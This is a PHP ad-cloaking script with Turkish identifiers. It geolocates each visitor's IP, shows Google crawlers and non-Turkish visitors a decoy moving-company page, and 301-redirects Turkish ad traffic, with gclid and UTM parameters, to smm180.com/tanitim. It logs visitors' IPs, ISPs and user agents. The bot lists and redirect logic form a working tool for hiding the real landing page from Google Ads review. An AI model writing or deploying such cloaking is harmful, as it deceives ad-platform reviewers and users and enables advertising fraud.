<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$hedef_url   = 'https://smm180.com/tanitim';
$tema_dizini = 'themes-nakliye';
$log_dizini  = 'log';
$hedef_ulke  = 'TR';

if (!is_dir($log_dizini)) {
    mkdir($log_dizini, 0755, true);
}

function logYaz($dosya_adi, $mesaj, $gercek_ip = '0.0.0.0', $detaylar = array()) {
    global $log_dizini;

    $tarih      = date('Y-m-d H:i:s');
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Bilinmiyor';
    $referer    = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direkt Giriş';

    $satir = '[' . $tarih . '] IP: ' . $gercek_ip . ' | UA: ' . $user_agent . ' | REF: ' . $referer . ' | ' . $mesaj;

    if (!empty($detaylar)) {
        $satir .= ' | DETAY: ' . json_encode($detaylar, JSON_UNESCAPED_UNICODE);
    }

    $satir .= PHP_EOL;
    file_put_contents($log_dizini . '/' . $dosya_adi, $satir, FILE_APPEND | LOCK_EX);
}

function gercekIpAl() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = trim($_SERVER['HTTP_CF_CONNECTING_IP']);
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
            return $ip;
        }
    }

    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

function konumBilgisiAl($ip) {
    $api_url = 'http://ip-api.com/json/' . urlencode($ip) . '?fields=status,countryCode,isp,query,org,as';

    $ch = curl_init($api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response  = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_hata = curl_error($ch);
    curl_close($ch);

    if ($curl_hata || $http_code !== 200 || !$response) {
        return array(
            'ulke'   => 'API_HATA',
            'isp'    => 'Bilinmiyor',
            'org'    => '',
            'as'     => '',
            'ip'     => $ip,
            'api_ok' => false
        );
    }

    $data = json_decode($response, true);

    if (is_array($data) && isset($data['status']) && $data['status'] === 'success') {
        return array(
            'ulke'   => isset($data['countryCode']) ? strtoupper($data['countryCode']) : 'Bilinmiyor',
            'isp'    => isset($data['isp']) ? $data['isp'] : 'Bilinmiyor',
            'org'    => isset($data['org']) ? $data['org'] : '',
            'as'     => isset($data['as']) ? $data['as'] : '',
            'ip'     => isset($data['query']) ? $data['query'] : $ip,
            'api_ok' => true
        );
    }

    return array(
        'ulke'   => 'Bilinmiyor',
        'isp'    => 'Bilinmiyor',
        'org'    => '',
        'as'     => '',
        'ip'     => $ip,
        'api_ok' => false
    );
}

function googleBotKontrol($user_agent, $isp_bilgisi) {
    $google_bot_ua = array(
        'googlebot',
        'googlebot-news',
        'googlebot-image',
        'googlebot-video',
        'googlebot-mobile',
        'googlebot-pagereader',
        'google-inspection',
        'google-inspectiontool',
        'adsbot-google',
        'adsbot-google-mobile',
        'adsbot-google-mobile-apps',
        'apis-google',
        'mediapartners-google',
        'feedfetcher-google',
        'google-read-aloud',
        'duplexweb-google',
        'google-safety',
        'google-pagerestoration',
        'google-web-light',
        'google-http-java-client',
        'google-favicon',
        'google-site-verification',
        'google-structured-data-testing-tool',
        'google-shopping',
        'google-speaker',
        'google-voice',
        'google-assistant',
        'google-cloud-functions',
        'google-apps-script',
        'google-docs',
        'google-sheets',
        'google-slides',
        'google-drive',
        'google-photos',
        'google-analytics',
        'google-tag-manager',
        'google-optimize',
        'google-publisher-plugin',
        'google-adsense',
        'google-adwords',
        'google-ads',
        'google-crawler',
        'google-proxy',
        'google-proxy-google'
    );

    $ua_kucuk = strtolower($user_agent);
    foreach ($google_bot_ua as $bot) {
        if (strpos($ua_kucuk, $bot) !== false) {
            return 'google_user_agent';
        }
    }

    $google_isp_anahtarlari = array(
        'google',
        'googlebot',
        'google.com',
        'google inc',
        'google cloud',
        'google llc',
        'google ireland',
        'google asia',
        'google vietnam',
        'google singapore',
        'google japan',
        'google australia',
        'google brazil',
        'google mexico',
        'google canada',
        'google uk',
        'google germany',
        'google france',
        'google spain',
        'google italy',
        'google netherlands',
        'google sweden',
        'google finland',
        'google norway',
        'google denmark',
        'google belgium',
        'google switzerland',
        'google austria',
        'google poland',
        'google czech',
        'google hungary',
        'google slovakia',
        'google portugal',
        'google greece',
        'google romania',
        'google bulgaria',
        'google croatia',
        'google slovenia',
        'google estonia',
        'google latvia',
        'google lithuania',
        'google malta',
        'google cyprus',
        'google luxembourg',
        'google iceland',
        'google russia',
        'google turkey',
        'google israel',
        'google india',
        'google china',
        'google taiwan',
        'google hong kong',
        'google korea',
        'google thailand',
        'google indonesia',
        'google malaysia',
        'google philippines',
        'google new zealand'
    );

    $isp_kucuk = strtolower($isp_bilgisi);
    foreach ($google_isp_anahtarlari as $anahtar) {
        if (strpos($isp_kucuk, $anahtar) !== false) {
            return 'google_isp';
        }
    }

    return false;
}

function temaGoster($tema_dizini) {
    $tema_dosyasi = $tema_dizini . '/index.html';

    if (file_exists($tema_dosyasi)) {
        readfile($tema_dosyasi);
    } else {
        echo '<!DOCTYPE html>' . "\n";
        echo '<html lang="tr">' . "\n";
        echo '<head>' . "\n";
        echo '<meta charset="UTF-8">' . "\n";
        echo '<title>Erişim Engellendi</title>' . "\n";
        echo '</head>' . "\n";
        echo '<body>' . "\n";
        echo '<div style="text-align:center; margin-top:50px; font-family:Arial;">' . "\n";
        echo '<h1 style="color:#333;">Erişim Engellendi</h1>' . "\n";
        echo '<p style="color:#666;">Bu sayfaya erişim izniniz bulunmamaktadır.</p>' . "\n";
        echo '</div>' . "\n";
        echo '</body>' . "\n";
        echo '</html>' . "\n";
    }

    exit;
}

// gclid ve diğer Google Ads parametrelerini al ve temizle
function gclidAl() {
    $params = array();

    // Ana gclid parametresi
    if (!empty($_GET['gclid'])) {
        $gclid = $_GET['gclid'];
        // Sadece güvenli karakterlere izin ver
        if (preg_match('/^[a-zA-Z0-9_\-\.]+$/', $gclid)) {
            $params['gclid'] = $gclid;
        }
    }

    // gbraid ve wbraid (iOS gizlilik güncellemesi sonrası Google'ın yeni parametreleri)
    foreach (array('gbraid', 'wbraid') as $param) {
        if (!empty($_GET[$param])) {
            $deger = $_GET[$param];
            if (preg_match('/^[a-zA-Z0-9_\-\.]+$/', $deger)) {
                $params[$param] = $deger;
            }
        }
    }

    // UTM parametreleri
    $utm_params = array('utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content');
    foreach ($utm_params as $param) {
        if (!empty($_GET[$param])) {
            $deger = htmlspecialchars(strip_tags($_GET[$param]), ENT_QUOTES, 'UTF-8');
            if (strlen($deger) <= 200) {
                $params[$param] = $deger;
            }
        }
    }

    return $params;
}

// Hedef URL'e parametreleri ekle
function hedefUrlOlustur($hedef_url, $params) {
    if (empty($params)) {
        return $hedef_url;
    }

    $ayrac = (strpos($hedef_url, '?') !== false) ? '&' : '?';
    return $hedef_url . $ayrac . http_build_query($params);
}

// ==================================================
// ANA PROGRAM AKIŞI
// ==================================================

$ip    = gercekIpAl();
$konum = konumBilgisiAl($ip);
$ulke  = isset($konum['ulke']) ? strtoupper($konum['ulke']) : 'Bilinmiyor';

// ISP bilgisini birleştir
$isp_tumu = '';
if (!empty($konum['isp'])) $isp_tumu .= $konum['isp'] . ' ';
if (!empty($konum['org'])) $isp_tumu .= $konum['org'] . ' ';
if (!empty($konum['as']))  $isp_tumu .= $konum['as'];
$isp_tumu = trim($isp_tumu);

// gclid ve Google Ads parametrelerini al
$ads_params = gclidAl();
$gclid_log  = !empty($ads_params['gclid']) ? $ads_params['gclid'] : 'YOK';

// Google bot kontrolü
$google_kontrol = googleBotKontrol(
    isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
    $isp_tumu
);

// Google bot ise temayı göster
if ($google_kontrol !== false) {
    logYaz('google_botlar.txt', 'GOOGLE BOT TESPIT EDILDI - Tema gösteriliyor', $ip, array(
        'ip'         => $ip,
        'ulke'       => $ulke,
        'isp'        => $isp_tumu,
        'tespit'     => $google_kontrol,
        'user_agent' => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''
    ));

    temaGoster($tema_dizini);
}

// API hatası varsa yönlendirme yapma
if (isset($konum['api_ok']) && $konum['api_ok'] === false) {
    logYaz('api_hatalar.txt', 'IP-API hatasi - Yonlendirme yapilmadi', $ip, array(
        'ip'   => $ip,
        'ulke' => $ulke,
        'isp'  => $isp_tumu
    ));

    temaGoster($tema_dizini);
}

// TR kullanıcıyı yönlendir
if ($ulke === $hedef_ulke) {

    // gclid ve diğer parametreleri taşı
    $yonlendirilecek_url = hedefUrlOlustur($hedef_url, $ads_params);

    logYaz('yonlendirilenler.txt', 'TR ziyaretci yonlendirildi', $ip, array(
        'ip'    => $ip,
        'ulke'  => $ulke,
        'isp'   => $isp_tumu,
        'gclid' => $gclid_log,
        'hedef' => $yonlendirilecek_url
    ));

    // 301 kullan - Google Ads gclid takibi için önerilir
    header('Location: ' . $yonlendirilecek_url, true, 301);
    exit;
}

// TR değil, Google bot değil → temayı göster
logYaz('yonlendirilmeyenler.txt', 'Yonlendirme yapilmadi - Tema gosteriliyor', $ip, array(
    'ip'    => $ip,
    'ulke'  => $ulke,
    'isp'   => $isp_tumu,
    'gclid' => $gclid_log,
    'google'=> $google_kontrol
));

temaGoster($tema_dizini);
?>